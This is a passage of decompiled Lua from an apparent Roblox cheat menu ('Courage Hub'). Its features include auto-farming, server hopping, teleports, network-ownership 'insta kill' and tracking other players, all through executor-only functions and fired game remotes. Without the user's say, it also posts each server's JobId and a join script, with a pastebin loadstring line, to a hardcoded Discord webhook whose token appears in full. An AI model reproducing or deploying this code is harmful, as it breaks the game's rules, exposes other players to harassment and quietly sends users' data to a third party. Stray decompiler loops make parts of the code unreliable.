
							if getChild() then
								fn18(CFrame.new(1017.3, 577.75, 3078.35))
							end

							if fn37() then
								local v30 = fn38()

								if #v30 > 0 then
									fn16("Picked up " .. #v30 .. " items", 2)
									fn35(v30)
								end

								task.wait(1)
								continue
							end

							local now3 = tick()
							local flag11 = false

							while rarityFarm2 and fn17("RarityFarm") and tick() - now3 < 10 do
								if fn36() then
									task.wait(1)
									continue
								end
								local children3 = trinketSpawns and trinketSpawns:GetChildren() or {}

								for _, child in ipairs(children3) do
									if not (rarityFarm2 and fn17("RarityFarm")) then
										break
									end

									if not child:IsA("BasePart") then
										continue
									end
									local child2 = getChild()
									if not child2 then
										task.wait(1)
										break
									end
									fn18(CFrame.new(child.Position + Vector3.new(0, -3, 0)))
									child2.AssemblyLinearVelocity = Vector3.zero
									task.wait(0.5)

									if fn37() then
										local v30 = fn38()

										if #v30 > 0 then
											fn16("Picked up " .. #v30 .. " items", 2)
											fn35(v30)
										end

										flag11 = true
										break
									end

									if tick() - now3 >= 10 then
										break
									end
								end

								if flag11 then
									break
								end

								if #children3 == 0 then
									task.wait(1)
								end
							end

							if not flag11 and rarityFarm2 and fn17("RarityFarm") and not fn36() then
								fn16("No target drops, hopping...", 2)
								task.wait(1)
								fn39()
								return
							end

							task.wait(0.5)
						end

						return
					end

					while true do
					end
				end)
			end,
		})

		v28:AddLabel("Hops servers when nothing matches")

		Config:AddDropdown("RFAutoSlot", {
			Text = "Auto Play Slot",
			Description = "Which save slot after hopping",
			Values = { "1", "2", "3" },
			Default = tostring(n10),
			Multi = false,
			Callback = function(autoPlaySlot)
				n10 = tonumber(autoPlaySlot) or 1
			end,
		})

		Config:AddInput("RFWebhook", {
			Text = "Discord Webhook",
			Description = "Sends when target rarity is found",
			Default = "",
			Placeholder = "https://discord.com/api/webhooks/...",
			Callback = function(discordWebhook)
				getgenv()._rfWebhookUrl = discordWebhook
			end,
		})

		task.defer(function()
			local rfWebhook = lib.Options.RFWebhook

			if rfWebhook and rfWebhook.Value and rfWebhook.Value ~= "" then
				getgenv()._rfWebhookUrl = rfWebhook.Value
			end
		end)

		local connection15 = nil
		local flag11 = false
		local v30 = false

		task.delay(10, function()
			v30 = true
		end)

		local function fn40()
			if not v30 then
				return
			end

			if flag11 then
				return
			end
			local mainMenuGui = localPlayer.PlayerGui:FindFirstChild("MainMenuGui")
			if not mainMenuGui or not mainMenuGui.Enabled then
				return
			end
			flag11 = true

			if connection15 then
				connection15:Disconnect()
				connection15 = nil
			end

			task.spawn(function()
				fn16("Auto spawning slot " .. n10, 3)

				for i = 1, 20 do
					local mainMenuGui2 = localPlayer.PlayerGui:FindFirstChild("MainMenuGui")
					local playButton = mainMenuGui2 and mainMenuGui2:FindFirstChild("Frame") and mainMenuGui2.Frame:FindFirstChild("PlayButton")
					if playButton and playButton.Visible then
						break
					end
					task.wait(0.5)
				end

				for i = 1, 10 do
					local mainMenuGui2 = localPlayer.PlayerGui:FindFirstChild("MainMenuGui")

					if mainMenuGui2 and mainMenuGui2.Enabled then
						local playButton = mainMenuGui2:FindFirstChild("Frame") and mainMenuGui2.Frame:FindFirstChild("PlayButton")

						if playButton then
							pcall(function()
								firesignal(playButton.MouseButton1Click)
							end)
						end

						task.wait(1)
						local saveSlotsGui = localPlayer.PlayerGui:FindFirstChild("SaveSlotsGui")
						if not (saveSlotsGui and saveSlotsGui.Enabled) then
							continue
						end
					end

					break
				end

				task.wait(1)

				for i = 1, 10 do
					local saveSlotsGui = localPlayer.PlayerGui:FindFirstChild("SaveSlotsGui")

					if saveSlotsGui and saveSlotsGui.Enabled then
						local scrollingFrame = saveSlotsGui:FindFirstChild("Frame") and saveSlotsGui.Frame:FindFirstChild("ScrollingFrame")
						local child = scrollingFrame and scrollingFrame:FindFirstChild("SaveSlot_" .. n10)
						local buttonsFrame = child and child:FindFirstChild("ButtonsFrame")
						local playButton = buttonsFrame and buttonsFrame:FindFirstChild("PlayButton")

						if playButton then
							pcall(function()
								firesignal(playButton.MouseButton1Click)
							end)
						end

						task.wait(1)
						local serverMenuGui = localPlayer.PlayerGui:FindFirstChild("ServerMenuGui")
						if not (serverMenuGui and serverMenuGui.Enabled) then
							continue
						end
					end

					break
				end

				task.wait(1)

				for i = 1, 10 do
					local serverMenuGui = localPlayer.PlayerGui:FindFirstChild("ServerMenuGui")
					if not (serverMenuGui and serverMenuGui.Enabled) then
						break
					end
					local mainFrame = serverMenuGui:FindFirstChild("Frame") and serverMenuGui.Frame:FindFirstChild("MainFrame")
					local scrollingFrame = mainFrame and mainFrame:FindFirstChild("ScrollingFrame")

					if scrollingFrame then
						for _, child in ipairs(scrollingFrame:GetChildren()) do
							if not child:IsA("ImageButton") then
								continue
							end

							for _, descendant in ipairs(child:GetDescendants()) do
								if descendant:IsA("TextLabel") and descendant.Text:find("Current Server") then
									pcall(function()
										firesignal(child.Activated)
									end)

									break
								end
							end
						end
					end

					task.wait(1)
					if not fn36() then
						break
					end
				end

				for i = 1, 30 do
					task.wait(1)
					if not fn36() then
						fn16("Spawned in", 2)
						return
					end
				end

				flag11 = false
			end)
		end

		tbl6.AutoSpawn = Config:AddToggle("AutoSpawn", {
			Text = "Auto Spawn In",
			Description = "Clicks through menus after hopping",
			Default = false,
			Callback = function(autoSpawnIn)
				if connection15 then
					connection15:Disconnect()
					connection15 = nil
				end

				flag11 = false
				if not autoSpawnIn then
					return
				end
				fn40()

				connection15 = service.Heartbeat:Connect(function()
					if flag11 then
						if connection15 then
							connection15:Disconnect()
							connection15 = nil
						end

						return
					end

					if not fn17("AutoSpawn") then
						return
					end
					fn40()
				end)
			end,
		})

		fn15(function()
			rarityFarm2 = false

			if connection15 then
				connection15:Disconnect()
				connection15 = nil
			end
		end)
	end

	local monsters3, flag11, connection15

	do
		local Config2 = tbl8.BossFarm:AddGroupbox("Config")
		monsters3 = workspace:FindFirstChild("Monsters")
		flag11 = false
		connection15 = nil
		local farmPosition2 = "Behind"
		local xOffset2 = 0
		local yOffset2 = 0
		local distance2 = 6.5
		local v28 = tbl8.BossFarm:AddGroupbox("Cell of Life Farm")
		local cellOfLifeFarm2 = false
		local connection16 = nil
		local cframe = CFrame.new(437, -915, -227)
		local cellOfLifeCrystalInteraction = game:GetService("ReplicatedStorage").Remotes:FindFirstChild("CellOfLifeCrystalInteraction")
		local consumableEvent = game:GetService("ReplicatedStorage").Remotes:FindFirstChild("ConsumableEvent")

		tbl6.CellFarm = v28:AddToggle("CellFarm", {
			Text = "Cell of Life Farm",
			Description = "MUST BE AT CELL OF LIFE ARENA — NEED SHADOWBEAM STAFF — If rubber banding lower tween speed to 25-30",
			Default = false,
			Callback = function(cellOfLifeFarm)
				cellOfLifeFarm2 = cellOfLifeFarm

				if connection16 then
					connection16:Disconnect()
					connection16 = nil
				end

				if not cellOfLifeFarm then
					return
				end

				task.spawn(function()
					fn18(cframe)
					fn16("At Cell of Life, summoning boss", 3)
					task.wait(1)

					if cellOfLifeCrystalInteraction then
						pcall(function()
							cellOfLifeCrystalInteraction:FireServer("SummonBoss", nil)
						end)
					end

					task.wait(2)
					local connection17 = nil

					connection17 = localPlayer.CharacterAdded:Connect(function()
						if not cellOfLifeFarm2 then
							if connection17 then
								connection17:Disconnect()
							end

							return
						end

						task.wait(3)
						if not cellOfLifeFarm2 then
							return
						end
						fn16("Died — recovering Cell farm", 3)
						fn18(cframe)
						task.wait(1)

						if cellOfLifeCrystalInteraction then
							pcall(function()
								cellOfLifeCrystalInteraction:FireServer("SummonBoss", nil)
							end)


						end
					end)

					local theCellOfLife2 = nil
					local position3 = nil
					local count2 = 0
					local flag12 = false

					connection16 = service.Heartbeat:Connect(function()
						if not cellOfLifeFarm2 then
							return
						end
						local character = getCharacter()

						if not character then
							theCellOfLife2 = nil
							position3 = nil
							return
						end

						local child = character:FindFirstChildOfClass("Humanoid")

						if not child or child.Health <= 0 then
							theCellOfLife2 = nil
							position3 = nil
							return
						end

						local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

						if not humanoidRootPart then
							theCellOfLife2 = nil
							position3 = nil
							return
						end

						if theCellOfLife2 then
							if not theCellOfLife2.Parent then
								fn16("Cell of Life killed, resummoning", 3)

								if getgenv()._chBossKillFn then
									task.spawn(getgenv()._chBossKillFn, "The Cell Of Life")
								end

								theCellOfLife2 = nil
								position3 = nil
								flag12 = false

								task.defer(function()
									task.wait(2)

									if cellOfLifeCrystalInteraction then
										pcall(function()
											cellOfLifeCrystalInteraction:FireServer("SummonBoss", nil)
										end)
									end
								end)

								return
							end

							local humanoid = theCellOfLife2:FindFirstChildOfClass("Humanoid")

							if not humanoid or humanoid.Health <= 0 then
								fn16("Cell of Life killed, resummoning", 3)

								if getgenv()._chBossKillFn then
									task.spawn(getgenv()._chBossKillFn, "The Cell Of Life")
								end

								theCellOfLife2 = nil
								position3 = nil
								flag12 = false

								task.defer(function()
									task.wait(2)

									if cellOfLifeCrystalInteraction then
										pcall(function()
											cellOfLifeCrystalInteraction:FireServer("SummonBoss", nil)
										end)
									end
								end)

								return
							end
						end

						if not theCellOfLife2 then
							if getgenv()._cellTweenBusy then
								return
							end

							if getgenv()._cellChestWait and tick() - getgenv()._cellChestWait < 10 then
								return
							end

							if getgenv()._cellChestWait then
								getgenv()._cellChestWait = nil
							end

							if cellOfLifeCrystalInteraction then
								pcall(function()
									cellOfLifeCrystalInteraction:FireServer("SummonBoss", nil)
								end)
							end

							if not monsters3 then
								monsters3 = workspace:FindFirstChild("Monsters")
							end

							local theCellOfLife = monsters3 and monsters3:FindFirstChild("The Cell Of Life")

							if theCellOfLife then
								local humanoid = theCellOfLife:FindFirstChildOfClass("Humanoid")



								if humanoid and humanoid.Health > 0 and not theCellOfLife:GetAttribute("MobDead") then
									theCellOfLife2 = theCellOfLife
									position3 = nil
									count2 = 0
									fn16("Cell of Life spawned!", 3)

									if getgenv()._chBossLockFn then
										getgenv()._chBossLockFn("The Cell Of Life")
									end
								end
							end

							if not theCellOfLife2 then
								local systems2 = workspace:FindFirstChild("Systems")
								if not systems2 then
									return
								end
								local interactPromptEvent2 = game:GetService("ReplicatedStorage").Remotes:FindFirstChild("InteractPromptEvent")

								for _, descendant in ipairs(systems2:GetDescendants()) do
									if not cellOfLifeFarm2 then
										break
									end

									if not descendant:IsA("Model") or descendant.Name ~= "Chest" then
										continue
									end

									if not descendant:FindFirstChild("IsInteractable") then
										continue
									end
									local argument = descendant:FindFirstChild("Argument")
									if not argument or argument.Value ~= "OpenChest" then
										continue
									end
									local handle = descendant:FindFirstChild("Handle") or descendant:FindFirstChildWhichIsA("BasePart")
									if not handle then
										continue
									end

									if (handle.Position - cframe.Position).Magnitude > 200 then
										continue
									end
									getgenv()._cellTweenBusy = true

									task.spawn(function()
										fn19(CFrame.new(handle.Position + Vector3.new(0, 1, 0)), function()
											return not cellOfLifeFarm2
										end)

										if interactPromptEvent2 then
											pcall(function()
												interactPromptEvent2:FireServer(argument.Value, descendant)
											end)
										end

										getgenv()._cellChestWait = tick()
										getgenv()._cellTweenBusy = false
									end)

									return
								end

								return
							end
						end

						local humanoidRootPart2 = theCellOfLife2:FindFirstChild("HumanoidRootPart") or theCellOfLife2:FindFirstChildWhichIsA("BasePart")
						if not humanoidRootPart2 then
							theCellOfLife2 = nil
							return
						end
						local position = humanoidRootPart2.Position

						if position3 then
							if (position - position3).Magnitude > 8 then
								count2 = 0
								position3 = position
								flag12 = false
								return
							end

							count2 += 1
						else
							count2 = 0
						end

						position3 = position
						local position2 = humanoidRootPart2.Position
						local vector = Vector3.new(position2.X, position2.Y + 43, position2.Z) - humanoidRootPart2.CFrame.LookVector * 9
						local vector2 = vector - humanoidRootPart.Position
						local magnitude = vector2.Magnitude

						if magnitude > 1 then
							humanoidRootPart.CFrame = CFrame.lookAt(humanoidRootPart.Position + vector2.Unit * math.min(tweenSpeed2 * 0.016666666666666666, magnitude), humanoidRootPart2.Position)
							humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
							humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
							child:Move(Vector3.new(vector2.Unit.X, 0, vector2.Unit.Z))
						else
							humanoidRootPart.CFrame = CFrame.lookAt(vector, humanoidRootPart2.Position)
							humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
							humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
							child:Move(Vector3.new(vector2.Unit.X, 0, vector2.Unit.Z))
						end

						local tool = character:FindFirstChildOfClass("Tool")

						if not tool or tool.Name ~= "Shadowbeam Staff" then
							local backpack = localPlayer:FindFirstChild("Backpack")
							local shadowbeamStaff = backpack and backpack:FindFirstChild("Shadowbeam Staff")

							if shadowbeamStaff then
								child:EquipTool(shadowbeamStaff)
							end
						end

						local tool2 = character:FindFirstChildOfClass("Tool")

						if tool2 and tool2:GetAttribute("ConsumableRemote") and consumableEvent then
							pcall(function()
								consumableEvent:FireServer(tool2.Name, CFrame.lookAt(humanoidRootPart.Position, humanoidRootPart2.Position))
							end)
						end
					end)
				end)
			end,
		})

		v28:AddSlider("CellTweenSpeed", {
			Text = "Tween Speed",
			Default = 30,
			Min = 5,
			Max = 5000,
			Rounding = 0,
			Callback = function(tweenSpeed)
				tweenSpeed2 = tweenSpeed
			end,
		})

		Config2:AddDropdown("BossFarmMode", {
			Text = "Farm Position",
			Description = "Position relative to boss",
			Values = { "Above", "Below", "In Front", "Behind" },
			Default = "Behind",
			Multi = false,
			Callback = function(farmPosition)
				farmPosition2 = farmPosition
			end,
		})

		Config2:AddSlider("BossFarmOffX", {
			Text = "X Offset",
			Default = 0,
			Min = -50,
			Max = 50,
			Rounding = 1,
			Callback = function(xOffset)
				xOffset2 = xOffset
			end,
		})

		Config2:AddSlider("BossFarmOffY", {
			Text = "Y Offset",
			Default = 0,
			Min = -50,
			Max = 50,
			Rounding = 1,
			Callback = function(yOffset)
				yOffset2 = yOffset
			end,
		})

		Config2:AddSlider("BossFarmDist", {
			Text = "Distance",
			Description = "Distance from boss",
			Default = 6.5,
			Min = 0,
			Max = 50,
			Rounding = 1,
			Callback = function(distance)
				distance2 = distance
			end,
		})

		local rewardWebhook2 = ""
		local tbl17 = {}
		local n11 = 0
		local str2 = ""

		Config2:AddInput("BossRewardWebhook", {
			Text = "Reward Webhook",
			Description = "Logs boss kill rewards",
			Default = "",
			Placeholder = "https://discord.com/api/webhooks/...",
			Callback = function(rewardWebhook)
				rewardWebhook2 = rewardWebhook
			end,
		})

		task.defer(function()
			task.wait(2)
			local bossRewardWebhook = lib.Options.BossRewardWebhook

			if bossRewardWebhook and bossRewardWebhook.Value and bossRewardWebhook.Value ~= "" then
				rewardWebhook2 = bossRewardWebhook.Value
			end
		end)

		local function fn34(arg, arg2)
			if rewardWebhook2 == "" then
				return
			end

			task.spawn(function()
				local request_ = request or syn and syn.request or http_request
				if not request_ then
					return
				end
				local HttpService = game:GetService("HttpService")
				local str3 = ""

				for _, v29 in ipairs(arg2) do
					str3 ..= "**" .. v29.name .. "** (" .. v29.rarity:lower() .. ")\n"
				end

				if str3 == "" then
					str3 = "No items"
				end

				local json = HttpService:JSONEncode({
					embeds = {
						{
							title = "Boss Killed — " .. arg,
							color = 16744448,
							description = str3,
							footer = { text = "Courage Hub | " .. localPlayer.Name },
							timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
						},
					},
				})

				pcall(function()
					request_({ Url = rewardWebhook2, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = json })
				end)
			end)
		end

		getgenv()._chBossRewardConn = nil
		getgenv()._chBpConn = nil

		local function fn35()
			if getgenv()._chBossRewardConn then
				return
			end
			local drops2 = workspace:FindFirstChild("Drops")

			if drops2 then
				getgenv()._chBossRewardConn = drops2.ChildRemoved:Connect(function(child)
					if str2 == "" then
						return
					end

					if child:IsA("Model") then
						table.insert(tbl17, { name = child.Name, rarity = child:GetAttribute("Rarity") or "Common" })
						return
					end

					do
						return
					end

					while true do
					end
				end)
			end

			local backpack = localPlayer:FindFirstChild("Backpack")

			if backpack and not getgenv()._chBpConn then
				getgenv()._chBpConn = backpack.ChildAdded:Connect(function(child)
					if str2 == "" then
						return
					end

					if not child:IsA("Tool") then
						return
					end
					local rarity = child:FindFirstChild("Rarity")
					table.insert(tbl17, { name = child.Name, rarity = rarity and rarity:IsA("StringValue") and rarity.Value or "Common" })
				end)
			end
		end

		fn35()

		getgenv()._chBossKillFn = function()
		end

		getgenv()._chBossLockFn = function(arg)
			if str2 ~= "" and #tbl17 > 0 then
				local leaderstats = localPlayer:FindFirstChild("leaderstats")
				math.max(0, (leaderstats and leaderstats:FindFirstChild("Silver") and leaderstats.Silver.Value or 0) - n11)
				fn34(str2, tbl17)
			end

			str2 = arg
			tbl17 = {}
			local leaderstats = localPlayer:FindFirstChild("leaderstats")
			n11 = leaderstats and leaderstats:FindFirstChild("Silver") and leaderstats.Silver.Value or 0
		end

		local tbl18 = {}

		if monsters3 then
			do
				monsters3.ChildAdded:Connect(function(child)
					task.wait(0.5)
					if not child:IsA("Model") then
						return
					end
					local child2 = child:FindFirstChildOfClass("Humanoid")
					if not child2 or child2.MaxHealth < 999 then
						return
					end

					if child.Name == "Training Dummy" then
						return
					end
					local str3 = game.JobId .. child.Name
					if tbl18[str3] then
						return
					end
					tbl18[str3] = true

					task.spawn(function()
						do
							local request_ = request or syn and syn.request or http_request
							if not request_ then
								return
							end
							task.wait(0.3 + math.random() * 0.5)
							local HttpService = game:GetService("HttpService")
							local str4 = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. tostring(game.PlaceId) .. ", \"" .. game.JobId .. "\")"
							local child3 = child:FindFirstChild("HumanoidRootPart") or child:FindFirstChildWhichIsA("BasePart")
							local str5 = ""

							if child3 then
								local position = child3.Position
								str5 = "loadstring(game:HttpGet(\"https://pastebin.com/raw/nd9mnqdP\"))(" .. string.format("%.1f, %.1f, %.1f", position.X, position.Y, position.Z) .. ")"
							end

							local tbl19 = {
								{
									name = "Players",
									value = tostring(#Players:GetPlayers()) .. "/" .. Players.MaxPlayers,
									inline = true,
								},
								{ name = "Join Script", value = "```lua\n" .. str4 .. "\n```", inline = false },
							}

							if str5 ~= "" then
								table.insert(tbl19, { name = "Go To It", value = "```lua\n" .. str5 .. "\n```", inline = false })
							end

							local json = HttpService:JSONEncode({
								embeds = {
									{
										title = "Boss Spawned — " .. child.Name,
										description = "**" .. child.Name .. "** — " .. math.floor(child2.MaxHealth) .. " HP",
										color = 16711680,
										fields = tbl19,
										footer = { text = "discord.gg/cRExVjwvaG — The Veil" },
										timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
									},
								},
							})

							pcall(function()
								request_({
									Url = "https://discord.com/api/webhooks/1554590216973459590/m8XqEB_6k2oJv9i3jauqIDJGBTDvkzIi89ZwKHk6ufVeDr2dxxXQbbareD_KaVaR8t1E",
									Method = "POST",
									Headers = {
										["Content-Type"] = "application/json",
									},
									Body = json,
								})
							end)

							return
						end

						while true do
						end
					end)

					fn16("Boss spawned: " .. child.Name, 5)
				end)
			end
		end

		fn15(function()
			flag11 = false
			cellOfLifeFarm2 = false

			if connection15 then
				connection15:Disconnect()
				connection15 = nil
			end

			if connection16 then
				connection16:Disconnect()
				connection16 = nil
			end
		end)
	end

	local tbl17 = {}

	local tbl18 = {
		RainEventActive = { name = "Rain", color = 3447003 },
		GoblinArmyEventActive = { name = "Goblin Army", color = 3066993 },
	}

	local function fn34(arg, arg2)
		if not arg2 then
			return
		end
		local str2 = game.JobId .. arg
		if tbl17[str2] then
			return
		end
		tbl17[str2] = true
		local v28 = tbl18[arg]
		if not v28 then
			return
		end

		task.spawn(function()
			local request_ = request or syn and syn.request or http_request
			if not request_ then
				return
			end
			task.wait(0.3 + math.random() * 0.5)
			local HttpService = game:GetService("HttpService")
			local str3 = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. tostring(game.PlaceId) .. ", \"" .. game.JobId .. "\")"

			local json = HttpService:JSONEncode({
				embeds = {
					{
						title = v28.name .. " Started",
						description = "**" .. v28.name .. "** is now active in this server.",
						color = v28.color,
						fields = {
							{
								name = "Players",
								value = tostring(#Players:GetPlayers()) .. "/" .. Players.MaxPlayers,
								inline = true,
							},
							{ name = "Join Script", value = "```lua\n" .. str3 .. "\n```", inline = false },
						},
						footer = { text = "discord.gg/cRExVjwvaG — The Veil" },
						timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
					},
				},
			})

			pcall(function()
				request_({
					Url = "https://discord.com/api/webhooks/1554590216973459590/m8XqEB_6k2oJv9i3jauqIDJGBTDvkzIi89ZwKHk6ufVeDr2dxxXQbbareD_KaVaR8t1E",
					Method = "POST",
					Headers = {
						["Content-Type"] = "application/json",
					},
					Body = json,
				})
			end)
		end)
	end

	local ReplicatedStorage = game:GetService("ReplicatedStorage")

	for k in pairs(tbl18) do
		if ReplicatedStorage:GetAttribute(k) == true then
			fn34(k, true)
		end

		ReplicatedStorage:GetAttributeChangedSignal(k):Connect(function()
			fn34(k, ReplicatedStorage:GetAttribute(k) == true)
		end)
	end

	local v28 = tbl8.PlayerFarm:AddGroupbox("Player Farm")
	local connection16 = nil
	local farmPlayers2 = false
	local str2 = ""

	local function getNames2()
		local names = { "Nearest" }

		for _, player in ipairs(Players:GetPlayers()) do
			if player ~= localPlayer then
				table.insert(names, player.Name)
			end
		end

		return names
	end

	tbl7.PlrFarmTarget = v28:AddDropdown("PlrFarmTarget", {
		Text = "Target Player",
		Description = "Pick a target",
		Values = getNames2(),
		Default = "Nearest",
		Multi = false,
		Callback = function(targetPlayer)
			str2 = targetPlayer == "Nearest" and "" or tostring(targetPlayer)
		end,
	})

	v28:AddButton({
		Text = "Refresh Players",
		Func = function()
			pcall(function()
				lib.Options.PlrFarmTarget:SetValues(getNames2())
			end)
		end,
	})

	tbl6.FarmPlayers = v28:AddToggle("FarmPlayers", {
		Text = "Farm Players",
		Description = "Auto farm a player",
		Default = false,
		Callback = function(farmPlayers)
			farmPlayers2 = farmPlayers

			if connection16 then
				connection16:Disconnect()
				connection16 = nil
			end

			if not farmPlayers then
				return
			end

			connection16 = service.Heartbeat:Connect(function()
				if not farmPlayers2 then
					return
				end
				local child = getChild()
				if not child then
					return
				end
				local magnitude2 = math.huge
				local humanoidRootPart2 = nil

				for _, player in ipairs(Players:GetPlayers()) do
					if player == localPlayer then
						continue
					end

					if str2 ~= "" and player.Name ~= str2 then
						continue
					end
					local character = player.Character
					if not character then
						continue
					end
					local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
					local child2 = character:FindFirstChildOfClass("Humanoid")

					if humanoidRootPart and child2 and child2.Health > 0 then
						local magnitude = (humanoidRootPart.Position - child.Position).Magnitude

						if magnitude < magnitude2 then
							magnitude2 = magnitude
							humanoidRootPart2 = humanoidRootPart
						end
					end
				end

				if humanoidRootPart2 then
					child.CFrame = CFrame.lookAt(humanoidRootPart2.Position - humanoidRootPart2.CFrame.LookVector * 6, humanoidRootPart2.Position)
					child.AssemblyLinearVelocity = Vector3.zero
					child.AssemblyAngularVelocity = Vector3.zero
				end
			end)
		end,
	})

	fn15(function()
		farmPlayers2 = false

		if connection16 then
			connection16:Disconnect()
			connection16 = nil
		end
	end)

	do
		local v29 = tbl8.NetOwn:AddGroupbox("Network Ownership")
		local tbl19 = {}
		local connection17 = nil
		local monsters4 = workspace:FindFirstChild("Monsters")

		local function getOk(arg)
			if isnetworkowner then
				local ok, result = pcall(isnetworkowner, arg)
				return ok and result
			end

			local ok, result = pcall(function()
				local child = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
				if not child then
					return false
				end
				local ok, result = pcall(gethiddenproperty, child, "NetworkOwnerV3")
				local ok2, result2 = pcall(gethiddenproperty, arg, "NetworkOwnerV3")
				return ok and ok2 and result ~= nil and result == result2
			end)

			return ok and result
		end

		local function getHumanoidRootPart2(model)
			return model:FindFirstChild("HumanoidRootPart") or model.PrimaryPart or model:FindFirstChild("Torso") or model:FindFirstChild("Head")
		end

		local function fn35()
			for k, v30 in pairs(tbl19) do
				if not k or not k.Parent then
					pcall(function()
						v30:Destroy()
					end)

					tbl19[k] = nil
				end
			end

			local v30 = ipairs
			local children3 = monsters4 and monsters4:GetChildren() or {}

			for _, child in v30(children3) do
				if not child:IsA("Model") then
					continue
				end
				local humanoidRootPart = getHumanoidRootPart2(child)

				if humanoidRootPart then
					if not tbl19[humanoidRootPart] then
						local highlight = Instance.new("Highlight", child)
						highlight.FillTransparency = 0.7
						tbl19[humanoidRootPart] = highlight
					end

					local v31 = tbl19[humanoidRootPart]
					v31.FillColor = pcall(getOk, humanoidRootPart) and getOk(humanoidRootPart) and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
					v31.OutlineColor = v31.FillColor
				end
			end
		end

		tbl6.ShowOwnership = v29:AddToggle("ShowOwnership", {
			Text = "Show Ownership",
			Description = "Show which mobs you control",
			Default = false,
			Callback = function(showOwnership)
				if showOwnership then
					if not connection17 then
						connection17 = service.Heartbeat:Connect(function()
							if fn17("ShowOwnership") then
								fn35()
							end

						end)

					end
				else
					if connection17 then
						connection17:Disconnect()
						connection17 = nil
					end

					for _, v30 in pairs(tbl19) do
						pcall(function()
							v30:Destroy()
						end)
					end

					tbl19 = {}
				end
			end,
		})

		v29:AddLabel("Green = you can insta kill them")
		v29:AddLabel("Red = server owned, insta kill won't work")

		fn15(function()
			if connection17 then


				connection17:Disconnect()
			end

			for _, v30 in pairs(tbl19) do
				pcall(function()
					v30:Destroy()
				end)
			end
		end)
	end

	do
		local v29 = tbl8.TPNpcs:AddGroupbox("Teleport to NPC")
		local npCs2 = workspace:FindFirstChild("NPCs")

		local function getNames3()
			do
				local names = {}
				local v30 = ipairs
				local children3 = npCs2 and npCs2:GetChildren() or {}

				for _, child in v30(children3) do
					if child:IsA("Model") then
						table.insert(names, child.Name)
					end
				end

				table.sort(names)
				return names
			end

			while true do
			end
		end

		local function getHumanoidRootPart2(instance)
			return instance:FindFirstChild("HumanoidRootPart") or instance:FindFirstChild("Torso") or instance:FindFirstChild("Part") or instance:FindFirstChild("Head")
		end

		local npc2 = nil

		tbl7.TPNpcSelect = v29:AddDropdown("TPNpcSelect", {
			Text = "NPC",
			Description = "Pick an NPC",
			Values = getNames3(),
			Default = nil,
			Multi = false,
			Callback = function(npc)
				npc2 = npc
			end,
		})

		v29:AddButton({
			Text = "Refresh NPCs",
			Func = function()
				pcall(function()
					tbl7.TPNpcSelect:SetValues(getNames3())
				end)
			end,
		})

		v29:AddButton({
			Text = "Teleport",
			Func = function()
				if not npc2 or npc2 == "" then
					fn16("Pick an NPC first", 2)
					return
				end
				local child = npCs2:FindFirstChild(npc2)
				if not child then
					fn16("NPC not found", 2)
					return
				end
				local humanoidRootPart = getHumanoidRootPart2(child)
				if not humanoidRootPart then
					fn16("NPC has no root part", 2)
					return
				end

				task.spawn(function()
					fn18(CFrame.new(humanoidRootPart.Position + Vector3.new(0, 3, 5)))
				end)
			end,
		})
	end

	do
		local v29 = tbl8.TPAreas:AddGroupbox("Teleport to Area")
		local Waypoints = tbl8.TPAreas:AddGroupbox("Waypoints")

		local areas = {
			Glade = CFrame.new(408, 55, 261),
			Veil = CFrame.new(0, 76, 0),
			Mines = CFrame.new(495, -30, -293),
			["The Pit"] = CFrame.new(1076, -32, -508),
			["Sky Island"] = CFrame.new(6, 1256, -6),
			["Cell of Life"] = CFrame.new(422, -555, -311),
			["Runner Camp"] = CFrame.new(-611, 77, 997),
		}

		local tbl19 = {}

		for k in pairs(areas) do
			table.insert(tbl19, k)
		end

		table.sort(tbl19)
		local area2 = nil

		tbl7.TPAreaSelect = v29:AddDropdown("TPAreaSelect", {
			Text = "Area",
			Description = "Pick an area",
			Values = tbl19,
			Default = nil,
			Multi = false,
			Callback = function(area)
				area2 = area
			end,
		})

		v29:AddButton({
			Text = "Teleport",
			Func = function()
				if not area2 then
					fn16("Pick an area first", 2)
					return
				end
				local area = areas[area2]
				if not area then
					return
				end

				task.spawn(function()
					fn18(area)
				end)
			end,
		})

		local tbl20 = {
			"Glade",
			"Veil",
			"Mines",
			"ThePit",
			"SkyIsland",
			"Scorch",
			"Shimmer",
			"Lone",
			"Cyst",
			"Aetherglow",
			"Fissure",
			"Ironkeep",
			"CampZero",
			"Pale",
			"Manor",
			"Crypt",
			"Echohold",
			"Colosseum",
			"TheTwentyShelves",
			"Sky",
			"CellOfLifeArena",
			"RunnerCamp",
		}

		table.sort(tbl20)
		local waypoint2 = nil

		tbl7.TPWaypointSelect = Waypoints:AddDropdown("TPWaypointSelect", {
			Text = "Waypoint",
			Description = "Pick a waypoint",
			Values = tbl20,
			Default = nil,
			Multi = false,
			Callback = function(waypoint)
				waypoint2 = waypoint
			end,
		})

		Waypoints:AddButton({
			Text = "Teleport via Waypoint",
			Description = "Teleport using game waypoints",
			Func = function()
				if not waypoint2 then
					fn16("Pick a waypoint first", 2)
					return
				end

				pcall(function()
					game:GetService("ReplicatedStorage").Remotes.TeleportToWaypoint:FireServer(waypoint2)
				end)
			end,
		})

		tbl6.UnlockWaypoints = Waypoints:AddToggle("UnlockWaypoints", {
			Text = "Unlock All Waypoints",
			Default = false,
			Callback = function(unlockAllWaypoints)
				if not unlockAllWaypoints then
					return
				end

				task.spawn(function()
					local ReplicatedStorage2 = game:GetService("ReplicatedStorage")
					local registerNPCInteraction2 = ReplicatedStorage2.Remotes:FindFirstChild("RegisterNPCInteraction")
					local dialogEvent2 = ReplicatedStorage2.Remotes:FindFirstChild("DialogEvent")
					if not registerNPCInteraction2 or not dialogEvent2 then
						fn16("Missing remotes", 3)
						return
					end

					local tbl21 = {
						{ name = "Glade", cf = CFrame.new(-89, 192, -119) },
						{ name = "Echohold", cf = CFrame.new(-200, 60, 600) },
